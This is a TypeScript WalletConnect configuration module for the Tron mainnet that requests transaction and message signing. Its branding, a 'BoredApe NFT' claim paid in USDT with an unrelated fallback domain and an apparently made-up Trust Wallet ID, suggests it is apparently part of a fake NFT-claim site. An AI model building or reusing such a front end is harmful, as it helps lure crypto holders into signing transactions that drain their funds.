// WalletConnect configuration for Tron
import type { WalletConnectModal } from "@walletconnect/modal";

export const PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "";

let provider: any = null;
let modal: WalletConnectModal | null = null;

export async function initWalletConnect() {
  if (provider) return provider;

  if (typeof window === "undefined") {
    throw new Error("WalletConnect can only be initialized in the browser.");
  }

  if (!PROJECT_ID) {
    throw new Error("Missing NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID.");
  }

  const { default: UniversalProvider } = await import("@walletconnect/universal-provider");
  provider = await UniversalProvider.init({
    projectId: PROJECT_ID,
    metadata: {
      name: "Ape NFT Claim",
      description: "Claim your exclusive BoredApe NFT with USDT",
      url: typeof window !== "undefined" ? window.location.origin : "http://empowerwealthpartners.com/",
      icons: ["https://avatars.githubusercontent.com/u/37784886"],
    },
    relayUrl: "wss://relay.walletconnect.com",
  });

  // Initialize modal
  if (!modal) {
    const { WalletConnectModal } = await import("@walletconnect/modal");
    modal = new WalletConnectModal({
      projectId: PROJECT_ID,
      chains: ["tron:0x2b6653dc"],
      themeMode: "dark",
      themeVariables: {
        "--wcm-z-index": "9999"
      },
      explorerRecommendedWalletIds: [
        "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0","8a9b2f7c6d4e1a3b5c9d0f8e7b6a4d1c3e9f2a8b5c7d6e4f1a" // Trust Wallet
      ],
      enableExplorer: true,
    });
  }

  return provider;
}

export async function connectWalletConnect() {
  const wcProvider = await initWalletConnect();

  // Open modal first to show wallet options
  modal?.openModal();

  // Show the modal and connect
  const session = await new Promise((resolve, reject) => {
    wcProvider.on("display_uri", (uri: string) => {
      console.log("WalletConnect URI:", uri);
      // Update modal with URI to show both QR code and wallet list
      modal?.openModal({ uri });
    });

    wcProvider.connect({
      namespaces: {
        tron: {
          methods: [
            "tron_signTransaction",
            "tron_signMessage",
          ],
          chains: ["tron:0x2b6653dc"], // Tron mainnet
          events: ["chainChanged", "accountsChanged"],
        },
      },
    }).then(resolve).catch(reject);
  });

  modal?.closeModal();
  return wcProvider;
}

export async function disconnectWalletConnect() {
  if (provider) {
    await provider.disconnect();
    provider = null;
  }
}

export function getWalletConnectProvider() {
  return provider;
}
